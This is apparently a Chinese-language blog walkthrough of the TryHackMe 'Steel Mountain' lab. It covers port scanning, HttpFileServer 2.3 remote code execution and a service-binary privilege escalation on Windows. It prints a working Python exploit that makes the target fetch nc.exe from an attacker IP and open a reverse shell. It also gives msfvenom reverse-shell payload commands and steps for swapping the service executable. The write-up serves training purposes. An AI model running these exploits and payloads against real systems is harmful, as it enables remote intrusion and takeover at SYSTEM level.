---
title: "Thm-Steel-Mountain"
date: "2024-05-14"
description: ""
---

![image.png](https://raw.githubusercontent.com/k1t0111/blog/main/image/20240514215439.png)

机器  

Steel Mountain 钢山

状态

未知

系统

windows

详细信息

HttpFileServer 2.3 远程代码执行 getshell PowerUp.ps1 服务提权

### [](#枚举端口 "枚举端口")枚举端口

```shell
Not shown: 989 closed portsPORT      STATE SERVICE80/tcp    open  http135/tcp   open  msrpc139/tcp   open  netbios-ssn445/tcp   open  microsoft-ds3389/tcp  open  ms-wbt-server8080/tcp  open  http-proxy49152/tcp open  unknown49153/tcp open  unknown49154/tcp open  unknown49155/tcp open  unknown49156/tcp open  unknown

```

### [](#开始前的小乐趣先🐍个人 "开始前的小乐趣先🐍个人")开始前的小乐趣先🐍个人

![image.png](https://raw.githubusercontent.com/k1t0111/blog/main/image/20240426145608.png)

![image.png](https://raw.githubusercontent.com/k1t0111/blog/main/image/20240426145853.png)

> 完美简单的 查找

### [](#详细枚举信息 "详细枚举信息")详细枚举信息

```shell
Starting Nmap 7.60 ( https://nmap.org )
at 2024-04-26 08:00 BSTNmap scan report for ip-10-10-35-123.eu-west-1.compute.internal (10.10.35.123)Host is up (0.00041s latency).PORT      STATE SERVICE      VERSION80/tcp    open  http         Microsoft IIS httpd 8.5| http-methods: |_  Potentially risky methods: TRACE|_http-server-header: Microsoft-IIS/8.5|_http-title: Site does not have a title (text/html).135/tcp   open  msrpc        Microsoft Windows RPC139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn445/tcp   open  microsoft-ds Microsoft Windows Server 2008 R2 - 2012 microsoft-ds3389/tcp  open  ssl          Microsoft SChannel TLS| fingerprint-strings: |  TLSSessionReq: |     f+Q4l|     steelmountain0|     240425063400Z|     241025063400Z0|     steelmountain0|     TANM|     (F!WM|     92kC|     1(G^y|     KNu!|     95V)|     $00|     ;iFf|     87&j|     ~%*d7|     0CPT|_    AeCu| ssl-cert: Subject: commonName=steelmountain| Not valid before: 2024-04-25T06:34:00|_Not valid after:  2024-10-25T06:34:00|_ssl-date: 2024-04-26T07:02:06+00:00;
0s from scanner time.8080/tcp  open  http         HttpFileServer httpd 2.3|_http-server-header: HFS 2.3|_http-title: HFS /49152/tcp open  msrpc        Microsoft Windows RPC49153/tcp open  msrpc        Microsoft Windows RPC49154/tcp open  msrpc        Microsoft Windows RPC49155/tcp open  msrpc        Microsoft Windows RPC49156/tcp open  msrpc        Microsoft Windows RPC。### 无法识别 3389的 服务版本1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :SF-Port3389-TCP:V=7.60%I=7%D=4/26%Time=662B5139%P=x86_64-pc-linux-gnu%r(TLSF:SSessionReq,346,\x16\x03\x03\x03A\x02\0\0M\x03\x03f\+Q4l\xbd\xd2\xa6%\SF:xd0\x151\xaf\xf5\x8c\x19E,\x8b\xe9>T\x02\xda\x9cP\x07:4\x04\xa6\xf0\x20SF:;#\0\x002\x93\x1f\xa1\xeb\x9d\x15\xef{\xf1%\x7f\x9d\xc4-\xca\x15\xf5\?\SF:xae\xa6\xff\x11\+\xd4\xd66a\0/\0\0\x05\xff\x01\0\x01\0\x0b\0\x02\xe8\0\SF:x02\xe5\0\x02\xe20\x82\x02\xde0\x82\x01\xc6\xa0\x03\x02\x01\x02\x02\x10SF:5\xf3\xaa\xabz~\*\xaeF\xf3\xc9yp\xb62\xa10\r\x06\t\*\x86H\x86\xf7\r\x01SF:\x01\x05\x05\x000\x181\x160\x14\x06\x03U\x04\x03\x13\rsteelmountain0\x1SF:e\x17\r240425063400Z\x17\r241025063400Z0\x181\x160\x14\x06\x03U\x04\x03SF:\x13\rsteelmountain0\x82\x01\"0\r\x06\t\*\x86H\x86\xf7\r\x01\x01\x01\x0SF:5\0\x03\x82\x01\x0f\x000\x82\x01\n\x02\x82\x01\x01\0\xa4\x93\xd2\x83\xcSF:5K\xfde\xe5\|C4\xff\x06u\xde%\xf8\xb4Z\x1e\xdb\xbf\xa2\x8b\xf4\x8f7\xdfSF:R\xfec\xe1g}u\x0e\xf8A9\xe8\x0cc\xb1\xca\xce\x9b\x1fp\x19\xcc\x97\x11\xSF:fc\x1c\xaa\xf0\x0c\x9e\x17\xd1\xa1\$\x93\xd2\xb6o\x20\x99Z\xfa\x89\xa9\SF:0C\x1b\x86\xfd\x8f\xba\(\xa4\.\xf6/\x03\xd1\xd9Bu\xbc\xd8},\xdcTANM\xe1SF:\xfe\x01\xae\x17\x1cK\xe4\xaa}h\xcb\x8f!\xff\(F!WM\xfd\xfe\xe892kC\xa5\SF:x96\xaa1\(G\^y\xdfiZX\xa4#\x82\xbao\xe4\x85\"Q,\xae\xc9\xcd\x98\xe3e\xfSF:5\x1d2`\xb2\x80KNu!\xe6\xd8F;\0\x1aau\xe5\x8d\xd7\xab\^\xd9\xc7\x04\x10SF:\xc6\x91\xa2\xb6\xc6\xa9\xda9;\xf6\xefw\xf1\x93N\x0ctL~\xc8\xc5\r\x1d\xSF:9dYpV\x82\x9d\xe0SG_\xd9\x11f\xf0\x196G\xc9\xe1\xd0M\n#\xec;\xff\x8fG#\SF:x04\x8c\xec8\xbf\xca\x84J\x97\xf5\xcd95V\)\xe3\xf6Q}r\xbf\xee}\x02\x03\SF:x01\0\x01\xa3\$0\"0\x13\x06\x03U\x1d%\x04\x0c0\n\x06\x08\+\x06\x01\x05\SF:x05\x07\x03\x010\x0b\x06\x03U\x1d\x0f\x04\x04\x03\x02\x0400\r\x06\t\*\xSF:86H\x86\xf7\r\x01\x01\x05\x05\0\x03\x82\x01\x01\0%u\x97\xd5\x17M\x0f\xeSF:7\xcd\xf0\r\xd1;iFf\xd4\xf3\xbc\xd9c\0\xc7\x03\x91J\xd0<d\x01\x08\xf6G_SF:l\x9dh\x89v\xf7\x14\x1a\xe0\xa7tr\x86\xed\xc6\xb0\xd6\xbb\x8b\xdaNT\xeaSF:\xd2\x08\xf8\x8c\x0cF\x1e\x7f3\xd0\x85D\x9e\xb4\+\xa687&j\x8fa2\x19\xaSF:c\xd9\x05\x15~%\*d7\x93\"\xc4-\x11\xff0CPT\x86\x02\xd3m`\x07%\xeb\xa5\xSF:16\x17%=\xaa\xf6\x95WKB\x87\xa7H\x12\xb9\xcb\xd3\x88\x8c\xf5%\xd1\xd3\xSF:be\xd0\xf4\x05\xc0\x16\x93\xd1\x1eg\xf8\x94\x8f8\xc0J\xb8g\xf3\xe5\x8d\SF:xf8\xab\xbb\xf4\xc7v\x8c\+\xedMY\xab\xce\x1a\x9a\x83s\xdbk\xf1\x14E\xa8SF:AeCu\x9e\x93\x85\xb5\[\xcf\x8b\xf9\xa1\xd7\x8f\xf5tPT\xcb\xa6o8\xadQ\xcSF:9!\x87y\xd2=;\xe4o\x07\xedh\[\x0e\x9d\xb6\xf2\xaf\^\xfa\x89G\xc4\xcf}\xSF:e5\xfc-\x8cg\xebZ@\*\xe1Al\x87x\xc0{Hy\xab\xf5,\xf6\r\xe7\x154n\xff\xcbSF:\x0e\0\0\0);MAC Address: 02:46:B7:98:AF:B5 (Unknown)Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed portAggressive OS guesses: Microsoft Windows Server 2008 SP2 Datacenter Version (98%), Microsoft Windows Server 2012 (96%), Microsoft Windows Server 2012 R2 (96%), Microsoft Windows Server 2012 R2 Update 1 (96%), Microsoft Windows 7, Windows Server 2012, or Windows 8.1 Update 1 (96%), Microsoft Windows Vista SP1 (95%), Microsoft Windows Server 2012 or Server 2012 R2 (93%), Microsoft Windows Server 2008 R2 (93%), Microsoft Windows Home Server 2011 (Windows Server 2008 R2)
(93%), Microsoft Windows Server 2008 SP1 (93%)No exact OS matches for host (test conditions non-ideal).Network Distance: 1 hopService Info: OSs: Windows, Windows Server 2008 R2 - 2012;
CPE: cpe:/o:microsoft:windowsHost script results:|_nbstat: NetBIOS name: STEELMOUNTAIN, NetBIOS user: <unknown>, NetBIOS MAC: 02:46:b7:98:af:b5 (unknown)| smb-security-mode: |   account_used: guest|   authentication_level: user|   challenge_response: supported|_  message_signing: disabled (dangerous, but default)| smb2-security-mode: |   2.02: |_    Message signing enabled but not required| smb2-time: |   date: 2024-04-26 08:02:06|_  start_date: 2024-04-26 07:33:53
```

### [](#详细分析一下 "详细分析一下")详细分析一下

### [](#80 "80")80

> \*\*\*1. **Microsoft IIS httpd 8.5**：该服务器运行的是Microsoft Internet Information Services（IIS）8.5版本，这是Microsoft的网络服务器软件。

2.  \***http-methods**：
    
    这行提到可能的HTTP方法。`TRACE`是一种潜在危险的方法，它会将收到的HTTP请求返回给客户端，可能会被用于跨站追踪攻击（Cross-Site Tracing，XST）等攻击手法。
    

### [](#139-445 "139 445")139 445

> 告诉我们了操作系统  
> Microsoft Windows Server 2008 R2 - 2012 microsoft-ds

### [](#3389 "3389")3389

> 根据你提供的扫描结果，看起来端口3389上运行的是Microsoft SChannel TLS服务，通常用于远程桌面连接（Remote Desktop Protocol，RDP）。以下是一些分析：

1.  \*\***3389/tcp open ssl**：这表示端口3389上运行的服务是基于SSL（Secure Sockets Layer）的，通常用于加密通信。在此情况下，它是Microsoft SChannel TLS，表明使用的是Windows的加密库。
    
2.  \***fingerprint-strings**：这部分提供了一些TLS握手阶段的字符串。这些字符串可能有助于识别所使用的TLS版本或其他信息。
    
3.  \***ssl-cert**：这是与SSL证书相关的信息。在这里，证书的主题(commonName)是 “steelmountain”，证书的有效期从 2024年4月25日到2024年10月25日。
    
4.  \***ssl-date**：这是SSL证书的日期信息，显示了扫描时的日期和时间，以及与证书相关的时间间隔。
    

### [](#8080 "8080")8080

> 端口8080上运行着HttpFileServer（HFS）2.3版本，这是一个基于HTTP协议的文件服务器软件。这意味着该服务器允许用户通过Web浏览器访问和管理文件。通过HTTP请求，用户可以上传、下载、删除和浏览服务器上的文件。在这种情况下，服务器的HTTP响应头中包含了”Server”字段，指示服务器版本为HFS 2.3。此外，HTTP响应标题显示为”HFS /“，表明服务器根目录的标题为”HFS”。\*\*\*\*  
> |

8080端口的 HttpFileServer2.3远程代码执行

[HttpFileServer2.3](HttpFileServer2.3.md)

### [](#打点 "打点")打点

> 8080 端口服务器HttpFileServer（HFS）2.3  
> ![image.png](https://raw.githubusercontent.com/k1t0111/blog/main/image/20240426153448.png)

> 启动msf 直接开始打  
> ![image.png](https://raw.githubusercontent.com/k1t0111/blog/main/image/20240426154233.png)  
> 配置相关配置

### [](#Getshell "Getshell")Getshell

> ![image.png](https://raw.githubusercontent.com/k1t0111/blog/main/image/20240426215559.png)

## [](#权限提升 "权限提升")权限提升

首先先拿脚本信息收集

[脚本信息收集](%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86.md#%E8%84%9A%E6%9C%AC%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86)

> 首先先下载 之后上传到 目标windows机器

```shell
upload /home/tom/get_power/windows/PowerUp.ps1
```

METERPRETER 加载

[Load](post.md#Load)

> load 加载

```powershell
meterpreter > load PowershellLoading extension powershell...Success.meterpreter > Powershell_shel[-] Unknown command: Powershell_shelmeterpreter > Powershell_shell[-] Unknown command: Powershell_shellmeterpreter > powershell_shellPS > 

```

> 执行扫描脚本  
> .\\PowerUp.ps1  
> 开启脚本测试看到许多服务

windows提权信息收集

[信息收集](%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86.md)

windows提权服务提权

[服务提权](%E6%9C%8D%E5%8A%A1%E6%8F%90%E6%9D%83.md)

```powershell
ServiceName    : AdvancedSystemCareService9Path           : C:\Program Files (x86)\IObit\Advanced SystemCare\ASCService.exeModifiablePath : @{ModifiablePath=C:\;
IdentityReference=BUILTIN\Users;
Permissions=AppendData/AddSubdirectory}StartName      : LocalSystemAbuseFunction  : Write-ServiceBinary -Name 'AdvancedSystemCareService9' -Path <HijackPath>CanRestart     : TrueName           : AdvancedSystemCareService9Check          : Unquoted Service Paths## 解释- **ServiceName**：服务名称是 "AdvancedSystemCareService9"。    - **Path**：该服务的路径是 "C:\Program Files (x86)\IObit\Advanced SystemCare\ASCService.exe"。    - **ModifiablePath**：这里提到的可修改路径指的是 "C:"，而且该路径上的权限是授予 "BUILTIN\Users" 组的，具有“追加数据/添加子目录”的权限。这意味着系统中的普通用户组可能对这个路径具有一定的写权限。    - **StartName**：服务是以 "LocalSystem" 账户启动的。这是 Windows 中权限最高的账户之一，通常用于系统服务。"StartName" 表示服务启动时所使用的用户账户。在这个描述中，它指定了服务是以 "LocalSystem" 账户启动的。"LocalSystem" 是 Windows 中的一个内置账户，拥有系统最高的权限。这意味着该服务在启动时具有系统级别的权限，可以执行许多操作，包括访问系统资源和执行系统级任务，而不受用户权限限制。    - **AbuseFunction**：该字段描述了一种潜在的滥用方式，即通过 `Write-ServiceBinary` 命令向这个服务的路径写入二进制文件。这种滥用可能导致恶意程序被注入到服务中。    - **CanRestart**：表示该服务可以重新启动。    - **Check**：描述这个服务存在的潜在风险是 "Unquoted Service Paths"，即未加引号的服务路径。这可能导致路径混淆，并被恶意攻击利用。
```

> 根据服务的信息收集来看我们已经 找到了 一个可以写的路径

### [](#载荷投递 "载荷投递")载荷投递

### [](#载荷生成 "载荷生成")载荷生成

msf生成木马

[Encoders 编码](msfvenom.md#Encoders%20%E7%BC%96%E7%A0%81)

```shell
### 先看一下系统信息systeminfoSystem Boot Time:          4/27/2024, 1:07:47 AMSystem Manufacturer:       XenSystem Model:              HVM domUSystem Type:               x64-based PC### 生成木马msfvenom  -p windows/x64/shell_reverse_tcp  LHOST=10.11.69.232 LPORT=4444  -f exe-service -o Advanced.exe## 首先先要 暂停服务## 服务暂停之后 才能对这个文件进行替换当前路径:C:\Users\bill\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\Advanced.execd "C:\Program Files (x86)\IObit\Advanced SystemCare\"C:\Program Files (x86)\IObit\Advanced SystemCare\ASCService.exeMove-Item -Path "C:\Users\bill\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\Advanced.exe" -Destination "C:\Program Files (x86)\IObit\Advanced SystemCare\ASCService.exe"sc start  相对服务的名字 直接get shell

```

### [](#非MSF-启动-非集成化脚本 "非MSF 启动(非集成化脚本)")非MSF 启动(非集成化脚本)

#### [](#httpfileserver "httpfileserver")httpfileserver

> [先找到exp](https://www.exploit-db.com/exploits/39161)  
> 修改 个人ip 和 端口

```python
import urllib2import systry:	def script_create():		urllib2.urlopen("http://"+sys.argv[1]+":"+sys.argv[2]+"/?search=%00{.+"+save+".}")	def execute_script():		urllib2.urlopen("http://"+sys.argv[1]+":"+sys.argv[2]+"/?search=%00{.+"+exe+".}")	def nc_run():		urllib2.urlopen("http://"+sys.argv[1]+":"+sys.argv[2]+"/?search=%00{.+"+exe1+".}")	ip_addr = "10.11.69.232" #local IP address	local_port = "9001" # Local Port number	vbs = "C:\Users\Public\script.vbs|dim%20xHttp%3A%20Set%20xHttp%20%3D%20createobject(%22Microsoft.XMLHTTP%22)%0D%0Adim%20bStrm%3A%20Set%20bStrm%20%3D%20createobject(%22Adodb.Stream%22)%0D%0AxHttp.Open%20%22GET%22%2C%20%22http%3A%2F%2F"+ip_addr+"%2Fnc.exe%22%2C%20False%0D%0AxHttp.Send%0D%0A%0D%0Awith%20bStrm%0D%0A%20%20%20%20.type%20%3D%201%20%27%2F%2Fbinary%0D%0A%20%20%20%20.open%0D%0A%20%20%20%20.write%20xHttp.responseBody%0D%0A%20%20%20%20.savetofile%20%22C%3A%5CUsers%5CPublic%5Cnc.exe%22%2C%202%20%27%2F%2Foverwrite%0D%0Aend%20with"	save= "save|" + vbs	vbs2 = "cscript.exe%20C%3A%5CUsers%5CPublic%5Cscript.vbs"	exe= "exec|"+vbs2	vbs3 = "C%3A%5CUsers%5CPublic%5Cnc.exe%20-e%20cmd.exe%20"+ip_addr+"%20"+local_port	exe1= "exec|"+vbs3	script_create()	execute_script()	nc_run()except:	print """[.]Something went wrong..!	Usage is :[.] python exploit.py <Target IP address>  <Target Port Number>	Don't forgot to change the Local IP address and Port number on the script"""

```

### [](#脚本利用 "脚本利用")脚本利用

### [](#第一次 "第一次")第一次

> 脚本向我们本地的web 服务器 请求 nc.exe

### [](#第二次 "第二次")![image.png](https://raw.githubusercontent.com/k1t0111/blog/main/image/20240503193856.png)第二次

> 脚本向目标 弹一个反向shell回来

下载 nc.exe 并且 搭建web服务

![image.png](https://raw.githubusercontent.com/k1t0111/blog/main/image/20240503193856.png)

### [](#Get-System "Get_System")Get\_System

> 今天继续找一个自动化信息收集脚本 winpeas

windwos 提权

[自动化脚本Winpeas](%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86.md#%E8%87%AA%E5%8A%A8%E5%8C%96%E8%84%9A%E6%9C%ACWinpeas)

> 使用web服务器将exe传送到 目标机器  
> 直接运行

```shell
Interesting Services -non Microsoft-� Check if you can overwrite some service binary or perform a DLL hijacking, also check for unquoted paths https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#services                  AdvancedSystemCareService9(IObit - Advanced SystemCare Service 9)[C:\Program Files (x86)\IObit\Advanced SystemCare\ASCService.exe] - Auto - Running - No quotes and Space detected    File Permissions: bill [WriteData/CreateFiles]    Possible DLL Hijacking in binary folder: C:\Program Files (x86)\IObit\Advanced SystemCare (bill [WriteData/CreateFiles])
Advanced SystemCare Service
```

> 依旧是 这个 文件  
> 服务 我们可以直接 创建一个exe来替代他

### [](#载荷投递-1 "载荷投递")载荷投递

```shell
msfvenom  -p windows/x64/shell_reverse_tcp  LHOST=10.11.69.232 LPORT=4444  -f exe-service -e x86/shikata_ga_nai  -o ASCService.exe

```

> 停止服务 AdvancedSystemCareService9  
> sc stop AdvancedSystemCareService9  
> 直接删除可执行文件ASCService.exe  
> 直接上传我们的自定义  
> ASCService.exe

```powershell
powershell -c Invoke-WebRequest -Uri "http://10.11.69.232:8080/ASCService.exe" -OutFile "ASCService.exe"  

```

### [](#get-system "get_system")get\_system

> sc start AdvancedSystemCareService9

开启监听 nc -nvlp 4444

### [](#总结 "总结")总结

> 这个靶场还是比较简单的 主要是 使用了两种方式让你学会如何利用软件进入 一台机器
